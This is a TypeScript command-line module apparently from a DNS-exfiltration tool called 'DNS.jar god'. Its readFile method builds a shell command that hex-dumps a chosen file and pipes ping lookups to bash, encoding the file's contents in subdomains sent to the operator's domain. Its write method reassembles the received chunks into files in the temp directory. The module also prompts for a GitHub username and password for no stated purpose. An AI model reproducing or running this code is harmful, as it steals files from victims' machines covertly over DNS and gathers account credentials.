import {Command} from '@oclif/command'
import * as chalk from 'chalk'
// @ts-ignore
import * as clear from 'clear'
// @ts-ignore
import * as figlet from 'figlet'
import {appendFileSync, readFileSync} from 'fs'
// @ts-ignore
import * as inquirer from 'inquirer'
import * as os from 'os'

import {Connector} from '../lib/connector'

export default class God extends Command {
  static description = 'DNS.jar god'

  static examples = ['Hi']

  static flags = {}

  static args = [{name: 'file'}]

  private connector: any

  private token: any

  private tmp = os.tmpdir() + '/'

  /**
   * App God
   */
  async run() {
    try {
      this.header()
      this.connector = new Connector(record => {
        this.write(record.data)
      }, (token: string) => {
        this.token = token
        this.log(
          chalk.greenBright('Successfully Authenticated'),
          chalk.greenBright('🔒'),
          '\n'
        )
        this.listener()
      })
    } catch (e) {
      this.warn(e)
    }
  }

  /**
   * Header
   */
  async header() {
    clear()
    this.log(
      chalk.greenBright(figlet.textSync('ِAzera', {font: 'Merlin1', horizontalLayout: 'full'})),
      chalk.bgGray(
        chalk.red('by:@') + chalk.cyanBright('xc0d') + chalk.greenBright('3rz')
      ),
      '\n'
    )
  }

  /**
   * Listener
   */
  async listener() {
    const questions = [
      {
        name: 'username',
        type: 'input',
        message: 'Enter your GitHub username or e-mail address:',
      },
      {
        name: 'password',
        type: 'password',
        message: 'Enter your password:',
      }
    ]
    return inquirer.prompt(questions)
  }

  /**
   * DNS Records Parser
   */
  async write(data: string) {
    let parts: Array<string> = data.toString().split('.')
    if (parts.length === 2) {
      await appendFileSync(this.tmp + parts[1], Buffer.from(data, 'hex').toString('utf8'))
    } else if (parts.length === 3 && parts[0] === '5f5f') {
      this.log((await readFileSync(this.tmp + parts[2]).toString()))
    } else {
      this.log(data)
    }
  }

  /**
   * Success
   */
  private success(input: string) {
    this.log(
      chalk.cyanBright(input)
    )
  }

  /**
   * Read file command
   */
  private readFile(path: string, id: string, token: string) {
    return `
    xxd -p ${path} | awk '{print "ping " $1 ".${id}.${token} -n 1" }' | bash && ping 5f5f.__.${id}.${token}
    `
  }
}
